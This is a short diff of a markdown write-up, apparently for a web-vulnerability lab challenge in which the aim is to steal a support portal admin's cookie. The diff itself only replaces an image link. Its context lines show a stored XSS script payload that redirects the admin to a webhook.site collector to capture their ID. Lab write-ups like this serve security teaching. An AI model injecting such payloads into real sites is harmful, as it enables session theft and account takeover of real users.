@@ -2,7 +2,7 @@
 
 ### In the challenge scenario, there is a support portal and an admin panel, and the objective is to steal the admin's cookie.
 
-![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/7f520183-0616-4337-9e0c-80f99c846294) ![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/7867570c-235d-437b-bf59-5aa9cf2c6e86)
+![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/7f520183-0616-4337-9e0c-80f99c846294) ![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/c5ed3da2-3235-41fc-b812-3f915537f5c8)
 
 - In the ticket section, I utilized a payload `<script>window.location.href='<webhook site Url'</script>` that redirects the admin to `webhook.site`. This allows me to steal the admin's ID from the intercepted request on `webhook.site`.
 
